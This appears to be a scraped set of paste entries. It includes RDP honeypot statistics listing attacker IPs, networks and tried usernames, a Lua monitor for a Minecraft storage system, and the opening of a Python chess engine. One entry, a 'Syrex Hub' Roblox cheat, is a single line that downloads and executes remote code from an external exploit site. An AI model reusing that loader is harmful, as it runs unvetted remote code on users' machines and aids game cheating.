    ""45.227.254.151"": 6,
    ""88.214.25.123"": 6,
    ""165.154.182.72"": 3,
    ""210.211.99.136"": 3,
    ""192.3.154.55"": 3,
    ""167.94.145.100"": 3,
    ""205.210.31.72"": 9
  },
  ""asn"": {
    ""AS14061"": 18,
    ""AS63949"": 27,
    ""AS396982"": 36,
    ""AS50219"": 30,
    ""AS398324"": 6,
    ""AS204428"": 30,
    ""AS201814"": 3,
    ""AS209372"": 18,
    ""AS7303"": 3,
    ""AS6327"": 6,
    ""AS17511"": 3,
    ""AS16276"": 3756,
    ""AS29465"": 3,
    ""AS210546"": 21,
    ""AS151185"": 9,
    ""AS267784"": 6,
    ""AS35042"": 6,
    ""AS135377"": 3,
    ""AS38731"": 3,
    ""AS36352"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""Censys, Inc."": 9,
    ""SS-Net"": 30,
    ""MEVSPACE sp. z o.o."": 3,
    ""WS Telecom Inc"": 18,
    ""Telecom Argentina S.A"": 3,
    ""Shaw Communications Inc."": 6,
    ""LINODE"": 12,
    ""OPTAGE Inc."": 3,
    ""OVH Singapore PTE. LTD"": 3753,
    ""MTN NIGERIA Communication limited"": 3,
    ""Miglovets Egor Andreevich"": 21,
    ""China Telecom"": 9,
    ""OVH SAS"": 3,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""VTDC"": 3,
    ""HostPapa"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 15,
    ""Digital Ocean"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Valence Technology Co"": 30,
    ""Censys, Inc"": 6,
    ""Unmanaged LTD"": 30,
    ""HostSlick"": 3,
    ""Stimul LLC"": 18,
    ""Digitalocean"": 9,
    ""Fibertel"": 3,
    ""Shaw Communications Inc"": 6,
    ""Linode, LLC"": 12,
    ""OPTAGE Inc."": 3,
    ""LTD, MassiveGRID"": 3753,
    ""MTN Nigeria"": 3,
    ""Natalia Aleksandrovna Petrova"": 21,
    ""Chinanet HB"": 9,
    ""OVH"": 3,
    ""Xwin Universal LTD"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Viettel - CHT Company Ltd"": 3,
    ""HostPapa"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""South West"": 15,
    ""New Jersey"": 15,
    ""California"": 42,
    ""North West"": 3795,
    ""Michigan"": 9,
    ""Sofia-Capital"": 30,
    ""Bavaria"": 3,
    ""Moscow"": 39,
    ""Buenos Aires"": 3,
    ""Alberta"": 6,
    ""Kyoto"": 3,
    ""Lagos"": 3,
    ""Hubei"": 9,
    ""Hauts-de-France"": 3,
    ""Vilnius"": 6,
    ""Kowloon City"": 6,
    ""Hanoi"": 3,
    ""New York"": 3
  },
  ""country"": {
    ""Singapore"": 3810,
    ""United States"": 69,
    ""Bulgaria"": 30,
    ""Germany"": 3,
    ""Russia"": 39,
    ""Argentina"": 3,
    ""Canada"": 6,
    ""Japan"": 3,
    ""Nigeria"": 3,
    ""China"": 9,
    ""France"": 3,
    ""Lithuania"": 6,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 3834,
    ""zrk2bkbo"": 12,
    ""beio"": 3,
    ""wJqBuHtOX"": 3,
    ""rrJbit"": 3,
    ""uFmSko"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 15,
    ""Administr"": 48,
    ""xyVUKpxNw"": 3,
    ""McOMFS"": 3,
    ""PTAyAz"": 3,
    ""gaLHSgrTF"": 3,
    ""bYWgqt"": 3,
    ""kWrhvm"": 3,
    ""Test"": 12,
    ""Administrator"": 3,
    ""SyQCEmkmw"": 3,
    ""RgklAh"": 3,
    ""wIREqq"": 3
  },
  ""keyboard"": {
    ""Unknown"": 3993
  },
  ""client_build"": {
    ""Unknown"": 3993
  },
  ""client_name"": {
    ""Unknown"": 3993
  },
  ""ip_type"": {
    ""hosting & proxy"": 6,
    ""hosting"": 3840,
    ""Unknown"": 144,
    ""mobile & hosting"": 3
  }
}"
GCxarMV6,Syrex Hub,gerisx,Lua,Monday 21st of July 2025 07:17:04 PM CDT,"--[[
    Syrex Hub
    ScriptBlox: https://scriptblox.com/script/Universal-Script-Syrex-Hub-30951
    Discord: https://discord.gg/syrexhub
    Supported Games:
      - Container RNG
      - Pet Simulator 99
      - Steal A Pet (By BIG Games)
      - Dig
      - Factory RNG
      - Grow A Garden
]]

loadstring(game:HttpGet(""http://bestexploits.xyz/loader""))()
"
rSKFU6tq,2025-07-21_stats.json,rdp_snitch,JSON,Monday 21st of July 2025 07:16:12 PM CDT,"{
  ""ip"": {
    ""159.223.43.222"": 4,
    ""45.79.152.94"": 8,
    ""143.110.138.22"": 2,
    ""147.185.132.73"": 6,
    ""194.164.107.6"": 20,
    ""167.94.138.175"": 2,
    ""80.94.95.75"": 20,
    ""194.180.49.127"": 2,
    ""88.214.50.58"": 12,
    ""147.185.132.249"": 6,
    ""188.166.231.132"": 6,
    ""181.30.42.98"": 2,
    ""96.51.53.164"": 4,
    ""45.33.87.154"": 2,
    ""167.94.138.123"": 2,
    ""139.162.13.76"": 8,
    ""128.22.147.233"": 2,
    ""51.79.199.48"": 2502,
    ""102.88.21.212"": 2,
    ""217.114.43.37"": 14,
    ""111.170.152.113"": 6,
    ""198.235.24.161"": 6,
    ""51.83.22.246"": 2,
    ""45.227.254.151"": 4,
    ""88.214.25.123"": 4,
    ""165.154.182.72"": 2,
    ""210.211.99.136"": 2,
    ""192.3.154.55"": 2,
    ""167.94.145.100"": 2,
    ""205.210.31.72"": 6
  },
  ""asn"": {
    ""AS14061"": 12,
    ""AS63949"": 18,
    ""AS396982"": 24,
    ""AS50219"": 20,
    ""AS398324"": 4,
    ""AS204428"": 20,
    ""AS201814"": 2,
    ""AS209372"": 12,
    ""AS7303"": 2,
    ""AS6327"": 4,
    ""AS17511"": 2,
    ""AS16276"": 2504,
    ""AS29465"": 2,
    ""AS210546"": 14,
    ""AS151185"": 6,
    ""AS267784"": 4,
    ""AS35042"": 4,
    ""AS135377"": 2,
    ""AS38731"": 2,
    ""AS36352"": 2,
    ""AS398705"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 12,
    ""Akamai Technologies, Inc."": 10,
    ""Google LLC"": 24,
    ""LNK SYSTEMS MUNTENIA SRL"": 20,
    ""Censys, Inc."": 6,
    ""SS-Net"": 20,
    ""MEVSPACE sp. z o.o."": 2,
    ""WS Telecom Inc"": 12,
    ""Telecom Argentina S.A"": 2,
    ""Shaw Communications Inc."": 4,
    ""LINODE"": 8,
    ""OPTAGE Inc."": 2,
    ""OVH Singapore PTE. LTD"": 2502,
    ""MTN NIGERIA Communication limited"": 2,
    ""Miglovets Egor Andreevich"": 14,
    ""China Telecom"": 6,
    ""OVH SAS"": 2,
    ""Flyservers S.A."": 4,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""VTDC"": 2,
    ""HostPapa"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 4,
    ""Linode"": 10,
    ""Digital Ocean"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Valence Technology Co"": 20,
    ""Censys, Inc"": 4,
    ""Unmanaged LTD"": 20,
    ""HostSlick"": 2,
    ""Stimul LLC"": 12,
    ""Digitalocean"": 6,
    ""Fibertel"": 2,
    ""Shaw Communications Inc"": 4,
    ""Linode, LLC"": 8,
    ""OPTAGE Inc."": 2,
    ""LTD, MassiveGRID"": 2502,
    ""MTN Nigeria"": 2,
    ""Natalia Aleksandrovna Petrova"": 14,
    ""Chinanet HB"": 6,
    ""OVH"": 2,
    ""Xwin Universal LTD"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Viettel - CHT Company Ltd"": 2,
    ""HostPapa"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""South West"": 10,
    ""New Jersey"": 10,
    ""California"": 28,
    ""North West"": 2530,
    ""Michigan"": 6,
    ""Sofia-Capital"": 20,
    ""Bavaria"": 2,
    ""Moscow"": 26,
    ""Buenos Aires"": 2,
    ""Alberta"": 4,
    ""Kyoto"": 2,
    ""Lagos"": 2,
    ""Hubei"": 6,
    ""Hauts-de-France"": 2,
    ""Vilnius"": 4,
    ""Kowloon City"": 4,
    ""Hanoi"": 2,
    ""New York"": 2
  },
  ""country"": {
    ""Singapore"": 2540,
    ""United States"": 46,
    ""Bulgaria"": 20,
    ""Germany"": 2,
    ""Russia"": 26,
    ""Argentina"": 2,
    ""Canada"": 4,
    ""Japan"": 2,
    ""Nigeria"": 2,
    ""China"": 6,
    ""France"": 2,
    ""Lithuania"": 4,
    ""Hong Kong"": 4,
    ""Vietnam"": 2
  },
  ""account"": {
    ""hello"": 2556,
    ""zrk2bkbo"": 8,
    ""beio"": 2,
    ""wJqBuHtOX"": 2,
    ""rrJbit"": 2,
    ""uFmSko"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""(empty)"": 10,
    ""Administr"": 32,
    ""xyVUKpxNw"": 2,
    ""McOMFS"": 2,
    ""PTAyAz"": 2,
    ""gaLHSgrTF"": 2,
    ""bYWgqt"": 2,
    ""kWrhvm"": 2,
    ""Test"": 8,
    ""Administrator"": 2,
    ""SyQCEmkmw"": 2,
    ""RgklAh"": 2,
    ""wIREqq"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2662
  },
  ""client_build"": {
    ""Unknown"": 2662
  },
  ""client_name"": {
    ""Unknown"": 2662
  },
  ""ip_type"": {
    ""hosting & proxy"": 4,
    ""hosting"": 2560,
    ""Unknown"": 96,
    ""mobile & hosting"": 2
  }
}"
e8xLYf7T,2025-07-21_stats.json,rdp_snitch,JSON,Monday 21st of July 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""159.223.43.222"": 2,
    ""45.79.152.94"": 4,
    ""143.110.138.22"": 1,
    ""147.185.132.73"": 3,
    ""194.164.107.6"": 10,
    ""167.94.138.175"": 1,
    ""80.94.95.75"": 10,
    ""194.180.49.127"": 1,
    ""88.214.50.58"": 6,
    ""147.185.132.249"": 3,
    ""188.166.231.132"": 3,
    ""181.30.42.98"": 1,
    ""96.51.53.164"": 2,
    ""45.33.87.154"": 1,
    ""167.94.138.123"": 1,
    ""139.162.13.76"": 4,
    ""128.22.147.233"": 1,
    ""51.79.199.48"": 1251,
    ""102.88.21.212"": 1,
    ""217.114.43.37"": 7,
    ""111.170.152.113"": 3,
    ""198.235.24.161"": 3,
    ""51.83.22.246"": 1,
    ""45.227.254.151"": 2,
    ""88.214.25.123"": 2,
    ""165.154.182.72"": 1,
    ""210.211.99.136"": 1,
    ""192.3.154.55"": 1,
    ""167.94.145.100"": 1,
    ""205.210.31.72"": 3
  },
  ""asn"": {
    ""AS14061"": 6,
    ""AS63949"": 9,
    ""AS396982"": 12,
    ""AS50219"": 10,
    ""AS398324"": 2,
    ""AS204428"": 10,
    ""AS201814"": 1,
    ""AS209372"": 6,
    ""AS7303"": 1,
    ""AS6327"": 2,
    ""AS17511"": 1,
    ""AS16276"": 1252,
    ""AS29465"": 1,
    ""AS210546"": 7,
    ""AS151185"": 3,
    ""AS267784"": 2,
    ""AS35042"": 2,
    ""AS135377"": 1,
    ""AS38731"": 1,
    ""AS36352"": 1,
    ""AS398705"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 6,
    ""Akamai Technologies, Inc."": 5,
    ""Google LLC"": 12,
    ""LNK SYSTEMS MUNTENIA SRL"": 10,
    ""Censys, Inc."": 3,
    ""SS-Net"": 10,
    ""MEVSPACE sp. z o.o."": 1,
    ""WS Telecom Inc"": 6,
    ""Telecom Argentina S.A"": 1,
    ""Shaw Communications Inc."": 2,
    ""LINODE"": 4,
    ""OPTAGE Inc."": 1,
    ""OVH Singapore PTE. LTD"": 1251,
    ""MTN NIGERIA Communication limited"": 1,
    ""Miglovets Egor Andreevich"": 7,
    ""China Telecom"": 3,
    ""OVH SAS"": 1,
    ""Flyservers S.A."": 2,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""VTDC"": 1,
    ""HostPapa"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 2,
    ""Linode"": 5,
    ""Digital Ocean"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Valence Technology Co"": 10,
    ""Censys, Inc"": 2,
    ""Unmanaged LTD"": 10,
    ""HostSlick"": 1,
    ""Stimul LLC"": 6,
    ""Digitalocean"": 3,
    ""Fibertel"": 1,
    ""Shaw Communications Inc"": 2,
    ""Linode, LLC"": 4,
    ""OPTAGE Inc."": 1,
    ""LTD, MassiveGRID"": 1251,
    ""MTN Nigeria"": 1,
    ""Natalia Aleksandrovna Petrova"": 7,
    ""Chinanet HB"": 3,
    ""OVH"": 1,
    ""Xwin Universal LTD"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Viettel - CHT Company Ltd"": 1,
    ""HostPapa"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""South West"": 5,
    ""New Jersey"": 5,
    ""California"": 14,
    ""North West"": 1265,
    ""Michigan"": 3,
    ""Sofia-Capital"": 10,
    ""Bavaria"": 1,
    ""Moscow"": 13,
    ""Buenos Aires"": 1,
    ""Alberta"": 2,
    ""Kyoto"": 1,
    ""Lagos"": 1,
    ""Hubei"": 3,
    ""Hauts-de-France"": 1,
    ""Vilnius"": 2,
    ""Kowloon City"": 2,
    ""Hanoi"": 1,
    ""New York"": 1
  },
  ""country"": {
    ""Singapore"": 1270,
    ""United States"": 23,
    ""Bulgaria"": 10,
    ""Germany"": 1,
    ""Russia"": 13,
    ""Argentina"": 1,
    ""Canada"": 2,
    ""Japan"": 1,
    ""Nigeria"": 1,
    ""China"": 3,
    ""France"": 1,
    ""Lithuania"": 2,
    ""Hong Kong"": 2,
    ""Vietnam"": 1
  },
  ""account"": {
    ""hello"": 1278,
    ""zrk2bkbo"": 4,
    ""beio"": 1,
    ""wJqBuHtOX"": 1,
    ""rrJbit"": 1,
    ""uFmSko"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""(empty)"": 5,
    ""Administr"": 16,
    ""xyVUKpxNw"": 1,
    ""McOMFS"": 1,
    ""PTAyAz"": 1,
    ""gaLHSgrTF"": 1,
    ""bYWgqt"": 1,
    ""kWrhvm"": 1,
    ""Test"": 4,
    ""Administrator"": 1,
    ""SyQCEmkmw"": 1,
    ""RgklAh"": 1,
    ""wIREqq"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1331
  },
  ""client_build"": {
    ""Unknown"": 1331
  },
  ""client_name"": {
    ""Unknown"": 1331
  },
  ""ip_type"": {
    ""hosting & proxy"": 2,
    ""hosting"": 1280,
    ""Unknown"": 48,
    ""mobile & hosting"": 1
  }
}"
DJQrzvKr,AE2 Display,April_The_Sergal,Lua,Monday 21st of July 2025 07:11:50 PM CDT,"-- ME System Monitor for CC:Tweaked (Optimized Drawing)

local monitor = peripheral.find(""monitor"")
local meBridge = peripheral.wrap(""bottom"")

if not monitor then 
    error(""Monitor not found"") 
end
if not meBridge then 
    error(""ME Bridge not found"") 
end

monitor.setTextScale(1)
local width, height = monitor.getSize()

-- Ensure width and height are valid numbers
if not width or not height or width <= 0 or height <= 0 then
    error(""Invalid monitor dimensions: "" .. tostring(width) .. ""x"" .. tostring(height))
end

local expanded = nil
local currentCPU = 1
local blink = true
local lastBlink = 0
local lastRefresh = 0
local lastClockTime = """"

-- Cache previous values to avoid unnecessary redraws
local prevValues = {
    storage_pct = -1,
    crafting_pct = -1,
    power_usage = -1,
    power_stored = -1,
    storage_warning = false
}

-- Make sure math operations return valid numbers
local halfWidth = math.max(1, math.floor(width/2))
local halfHeight = math.max(1, math.floor(height/2))

local quads = {
    {1, 1, halfWidth, halfHeight},
    {halfWidth + 1, 1, width, halfHeight},
    {1, halfHeight + 1, halfWidth, height},
    {halfWidth + 1, halfHeight + 1, width, height}
}

local histories = {{}, {}, {}, {}}
local events = {}
local MAX_HISTORY = math.max(10, width - 4)
local MAX_EVENTS = 5

local function logEvent(msg)
    table.insert(events, 1, os.date(""%H:%M:%S"") .. "" - "" .. msg)
    if #events > MAX_EVENTS then 
        table.remove(events) 
    end
end

local function clearArea(x1, y1, x2, y2, color)
    -- Validate coordinates
    x1, y1, x2, y2 = math.max(1, x1), math.max(1, y1), math.min(width, x2), math.min(height, y2)
    
    monitor.setBackgroundColor(color or colors.black)
    for y = y1, y2 do
        monitor.setCursorPos(x1, y)
        monitor.write(string.rep("" "", math.max(0, x2 - x1 + 1)))
    end
end

local function drawCenteredText(x1, x2, y, text, textColor, bg)
    -- Validate coordinates and text
    if not text or y < 1 or y > height then return end
    
    monitor.setTextColor(textColor or colors.white)
    monitor.setBackgroundColor(bg or colors.black)
    
    -- Clear the line first
    local lineWidth = x2 - x1 + 1
    monitor.setCursorPos(x1, y+1)
    monitor.write(string.rep("" "", lineWidth))
    
    -- Then draw centered text
    local cx = math.max(x1, math.floor((x1 + x2 - #text) / 2))
    monitor.setCursorPos(cx, y)
    monitor.write(string.sub(text, 1, lineWidth))
end

local function drawBorder(x1, y1, x2, y2, color)
    -- Validate coordinates
    x1, y1, x2, y2 = math.max(1, x1), math.max(1, y1), math.min(width, x2), math.min(height, y2)
    
    monitor.setBackgroundColor(color)
    for x = x1, x2 do
        if y1 >= 1 and y1 <= height then
            monitor.setCursorPos(x, y1) 
            monitor.write("" "")
        end
        if y2 >= 1 and y2 <= height and y2 ~= y1 then
            monitor.setCursorPos(x, y2) 
            monitor.write("" "")
        end
    end
    for y = y1 + 1, y2 - 1 do
        if y >= 1 and y <= height then
            monitor.setCursorPos(x1, y) 
            monitor.write("" "")
            if x2 ~= x1 then
                monitor.setCursorPos(x2, y) 
                monitor.write("" "")
            end
        end
    end
end

local function drawProgressBar(x1, y, x2, percent, bg, fg)
    -- Validate inputs
    if y < 1 or y > height or x1 > x2 then return end
    
    local barLen = math.max(0, x2 - x1 + 1)
    local fill = math.max(0, math.min(barLen, math.floor(barLen * math.max(0, math.min(1, percent or 0)))))
    
    -- Always redraw the entire progress bar (consistent height and colors)
    monitor.setCursorPos(x1, y)
    monitor.setBackgroundColor(bg)
    monitor.write(string.rep("" "", barLen))
    
    if fill > 0 then
        monitor.setCursorPos(x1, y)
        monitor.setBackgroundColor(fg)
        monitor.write(string.rep("" "", fill))
    end
end

local function getColorByPercent(p)
    p = p or 0
    if p > 0.75 then return colors.green
    elseif p > 0.5 then return colors.yellow
    elseif p > 0.25 then return colors.orange
    else return colors.red end
end

local function drawClock()
    local t = textutils.formatTime(os.time(), true)
    if t ~= lastClockTime then
        -- Clear only the clock area
        monitor.setCursorPos(1, height)
        monitor.setBackgroundColor(colors.black)
        monitor.write(string.rep("" "", width))
        
        -- Draw new time
        monitor.setTextColor(colors.lightGray)
        monitor.setBackgroundColor(colors.black)
        local cx = math.floor((width - #t) / 2)
        monitor.setCursorPos(cx, height)
        monitor.write(t)
        lastClockTime = t
    end
end

local function updateHistories()
    -- Safely get ME system data with error handling
    local success, used = pcall(function() return meBridge.getUsedItemStorage() end)
    if not success then used = 0 end
    
    local success, total = pcall(function() return meBridge.getTotalItemStorage() end)
    if not success or not total or total <= 0 then total = 1 end
    
    table.insert(histories[2], used / total)

    local success, cpus = pcall(function() return meBridge.getCraftingCPUs() end)
    if not success then cpus = {} end
    cpus = cpus or {}
    
    local busy = 0
    for _, c in ipairs(cpus) do 
        if c.busy then busy = busy + 1 end 
    end
    table.insert(histories[1], #cpus > 0 and (busy / #cpus) or 0)

    local success, power = pcall(function() return meBridge.getEnergyStorage() end)
    if not success then power = 0 end
    power = power or 0
    
    table.insert(histories[4], power / 1000000)

    -- Trim histories
    for i = 1, 4 do 
        if #histories[i] > MAX_HISTORY then 
            table.remove(histories[i], 1) 
        end 
    end
end

local function drawHistograph(x1, y1, x2, y2, data, color)
    -- Validate coordinates
    if x1 > x2 or y1 > y2 or y1 < 1 or y2 > height then return end
    
    local w = x2 - x1 + 1
    local h = y2 - y1
    
    if w <= 0 or h <= 0 then return end
    
    -- Always redraw the entire histograph area (consistent display)
    for i = 1, math.min(w, #data) do
        local val = math.max(0, math.min(1, data[#data - i + 1] or 0))
        local heightFill = math.floor(h * val)
        
        for j = 0, h - 1 do
            local plotY = y2 - j
            local plotX = x2 - i + 1
            
            if plotY >= 1 and plotY <= height and plotX >= 1 and plotX <= width then
                monitor.setCursorPos(plotX, plotY)
                if j < heightFill then
                    monitor.setBackgroundColor(color)
                else
                    monitor.setBackgroundColor(colors.black)
                end
                monitor.write("" "")
            end
        end
    end
end

local function drawEvents(x1, x2, startY)
    -- Always redraw events (they change frequently)
    for i = 1, MAX_EVENTS do
        local drawY = startY + i - 1
        if drawY >= 1 and drawY <= height - 1 then
            monitor.setCursorPos(x1, drawY)
            monitor.setTextColor(colors.gray)
            monitor.setBackgroundColor(colors.black)
            
            local event = events[i]
            if event then
                monitor.write(string.sub(event, 1, math.max(0, x2 - x1 + 1)))
            else
                monitor.write(string.rep("" "", math.max(0, x2 - x1 + 1)))
            end
        end
    end
end

local function drawStorage(x1, y1, x2, y2, forceRedraw)
    local success, used = pcall(function() return meBridge.getUsedItemStorage() end)
    if not success then used = 0 end
    
    local success, total = pcall(function() return meBridge.getTotalItemStorage() end)
    if not success or not total or total <= 0 then total = 1 end
    
    local pct = used / total
    local isWarning = pct > 0.75
    local bg = isWarning and colors.red or colors.black

    -- Only redraw if values changed or forced
    if forceRedraw or math.abs(pct - prevValues.storage_pct) > 0.001 or prevValues.storage_warning ~= isWarning then
        clearArea(x1, y1, x2, y2, bg)
        drawCenteredText(x1, x2, y1 + 1, ""STORAGE"", colors.white, bg)
        drawBorder(x1, y1, x2, y2, colors.white)
        prevValues.storage_pct = pct
        prevValues.storage_warning = isWarning
    end
    
    -- Always update percentage and progress bar
    drawCenteredText(x1, x2, y1 + 3, (math.floor(pct * 1000)/10)..""% Used"", colors.white, bg)
    
    if y1 + 5 <= y2 and x1 + 4 <= x2 then
        drawProgressBar(x1+2, y1+5, x2-2, pct, colors.blue, getColorByPercent(pct))
    end

    -- Handle blinking warning (keep as is)
    if isWarning and blink and y2 - 2 >= y1 then
        drawCenteredText(x1, x2, y2-2, ""!!WARNING!!"", colors.white, colors.red)
        if not prevValues.storage_warning then
            logEvent(""Low Free Storage"")
        end
    elseif isWarning and not blink and y2 - 2 >= y1 then
        -- Clear warning line when not blinking
        monitor.setCursorPos(x1, y2-2)
        monitor.setBackgroundColor(bg)
        monitor.write(string.rep("" "", x2 - x1 + 1))
    end
end

local function drawCrafting(x1, y1, x2, y2, forceRedraw)
    local success, cpus = pcall(function() return meBridge.getCraftingCPUs() end)
    if not success then cpus = {} end
    cpus = cpus or {}
    
    local count = #cpus
    local busy = 0
    for _, cpu in ipairs(cpus) do 
        if cpu.busy then busy = busy + 1 end 
    end
    local pct = count > 0 and (busy / count) or 0

    -- Only redraw static elements if forced or first time
    if forceRedraw or prevValues.crafting_pct < 0 then
        clearArea(x1, y1, x2, y2, colors.black)
        drawCenteredText(x1, x2, y1 + 1, ""CRAFTING"", colors.white)
        drawBorder(x1, y1, x2, y2, colors.white)
    end
    
    -- Always update dynamic content
    if math.abs(pct - prevValues.crafting_pct) > 0.001 or forceRedraw then
        drawCenteredText(x1, x2, y1 + 3, ""Busy: "" .. busy .. ""/"" .. count, colors.white)
        
        if y1 + 5 <= y2 and x1 + 4 <= x2 then
            drawProgressBar(x1+2, y1+5, x2-2, pct, colors.gray, colors.green)
        end
        prevValues.crafting_pct = pct
    end
end

local function drawPower(x1, y1, x2, y2, forceRedraw)
    local success, usage = pcall(function() return meBridge.getAvgPowerUsage() end)
    if not success then usage = 0 end
    usage = usage or 0
    
    local success, stored = pcall(function() return meBridge.getEnergyStorage() end)
    if not success then stored = 0 end
    stored = stored or 0

    -- Only redraw static elements if forced or first time
    if forceRedraw or prevValues.power_usage < 0 then
        clearArea(x1, y1, x2, y2, colors.black)
        drawCenteredText(x1, x2, y1 + 1, ""POWER"", colors.white)
        drawBorder(x1, y1, x2, y2, colors.white)
    end
    
    -- Update dynamic content only when changed
    if math.abs(usage - prevValues.power_usage) > 1 or math.abs(stored - prevValues.power_stored) > 100 or forceRedraw then
        drawCenteredText(x1, x2, y1 + 3, ""Avg: ""..math.floor(usage).."" RF/t"", colors.white)
        drawCenteredText(x1, x2, y1 + 4, ""Stored: ""..math.floor(stored), colors.white)
        
        if stored < 10000 and prevValues.power_stored >= 10000 then
            logEvent(""Low Power: ""..stored) 
        end
        
        prevValues.power_usage = usage
        prevValues.power_stored = stored
    end
end

local function drawWIP(x1, y1, x2, y2, forceRedraw)
    if forceRedraw then
        clearArea(x1, y1, x2, y2, colors.black)
        local midY = y1 + math.floor((y2 - y1) / 2)
        drawCenteredText(x1, x2, midY, ""WIP"", colors.gray)
        drawBorder(x1, y1, x2, y2, colors.white)
    end
end

local function drawAll(forceRedraw)
    if forceRedraw then
        monitor.clear()
    end

    for i = 1, 4 do
        local q = quads[i]
        if i == 1 then drawCrafting(q[1], q[2], q[3], q[4], forceRedraw)
        elseif i == 2 then drawStorage(q[1], q[2], q[3], q[4], forceRedraw)
        elseif i == 3 then drawWIP(q[1], q[2], q[3], q[4], forceRedraw)
        elseif i == 4 then drawPower(q[1], q[2], q[3], q[4], forceRedraw) end
    end
    drawClock()
end

local function drawExpanded(index, forceRedraw)
    -- Only clear when first expanding or explicitly forced
    if forceRedraw then
        monitor.clear()
        clearArea(1, 1, width, height, colors.black)
        
        -- Draw back button (only when clearing)
        monitor.setBackgroundColor(colors.white)
        monitor.setTextColor(colors.black)
        monitor.setCursorPos(math.max(1, width - 8), 1)
        monitor.write(""[ BACK ]"")
    end

	monitor.setBackgroundColor(colors.white)
    monitor.setTextColor(colors.black)
    monitor.setCursorPos(math.max(1, width - 8), 1)
    monitor.write(""[ BACK ]"")

    -- Draw expanded view (selective updates)
    if index == 1 then drawCrafting(1, 1, width, height, forceRedraw)
    elseif index == 2 then drawStorage(1, 1, width, height, forceRedraw)
    elseif index == 3 then drawWIP(1, 1, width, height, forceRedraw)
    elseif index == 4 then drawPower(1, 1, width, height, forceRedraw) end

    -- Draw histograph if there's space (always update as data changes)
    local histY1 = math.max(1, math.floor(height/2) - 6)
    local histY2 = math.min(height, math.floor(height/2) + 2)
    
    if histY1 < histY2 and width > 4 then
        drawHistograph(2, histY1, width - 2, histY2, histories[index], colors.lime)
    end
    
    -- Draw events (always update as they change)
    local eventsY = math.min(height - 1, math.floor(height/2) + 3)
    if eventsY > 0 and width > 4 then
        drawEvents(2, width - 2, eventsY)
    end
    
    drawClock()
end

local function handleClick(x, y)
    if expanded then
        if x >= width - 8 and y == 1 then 
            expanded = nil 
            -- Force redraw when going back to quad view
			monitor.clear()
            drawAll(true)
        end
    else
        for i, q in ipairs(quads) do
            if x >= q[1] and x <= q[3] and y >= q[2] and y <= q[4] then
                expanded = i
                drawExpanded(expanded, true)  -- Force clear when first expanding
                return
            end
        end
    end
end

local function tick()
    while true do
        local t = os.clock()
        local needsUpdate = false
        
        -- Handle blinking
        if t - lastBlink >= 0.5 then
            blink = not blink
            lastBlink = t
            needsUpdate = true
        end

        -- Handle refresh
        if t - lastRefresh >= 1 then
            updateHistories()
            lastRefresh = t
            needsUpdate = true
        end
        
        -- Only redraw when needed
        if needsUpdate then
            if expanded then
                drawExpanded(expanded, false) -- Don't force clear in expanded view
            else
                drawAll(false) -- Don't force clear
            end
        end

        os.sleep(0.1)
    end
end

local function clickHandler()
    while true do
        local event, side, x, y = os.pullEvent(""monitor_touch"")
        handleClick(x, y)
    end
end

-- Initialize display
monitor.clear()
logEvent(""System Started"")

-- Reset cache values to force initial draw
prevValues.storage_pct = -1
prevValues.crafting_pct = -1
prevValues.power_usage = -1
prevValues.power_stored = -1

drawAll(true)

-- Run the program
parallel.waitForAny(tick, clickHandler)"
76jm9jJC,excellent 4 OK very good final with history,max2201111,Python,Monday 21st of July 2025 04:29:38 PM CDT,"import time
import copy
from datetime import datetime
from typing import List, Tuple, Optional, Dict, Set

class ChessEngine:
    def __init__(self):
        # Základní nastavení
        self.board = [['' for _ in range(8)] for _ in range(8)]
        self.white_to_move = True
        self.castling_rights = {'K': True, 'Q': True, 'k': True, 'q': True}
        self.en_passant = None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        
        # Hodnoty figur pro evaluaci
        self.piece_values = {
            'P': 100, 'N': 320, 'B': 330, 'R': 500, 'Q': 900, 'K': 20000,
            'p': -100, 'n': -320, 'b': -330, 'r': -500, 'q': -900, 'k': -20000,
            'A': 1200, 'a': -1200,  # Amazonka (kůň + dáma)
            'C': 800, 'c': -800,    # Cyril (kůň + věž)
            'E': 650, 'e': -650     # Eve (kůň + střelec)
        }
        
        # Historie tahů pro výpis cesty
        self.move_history = []
        self.position_history = []
        
    def load_fen(self, fen: str):
        """"""Načte pozici z FEN stringu""""""
        # Nejdříve vymaž šachovnici
        self.board = [['' for _ in range(8)] for _ in range(8)]
        
        parts = fen.split()
        
        # Parsování pozice
        rows = parts[0].split('/')
        for row_idx, row in enumerate(rows):
            if row_idx >= 8:  # Ochrana proti příliš mnoha řádkům
                break
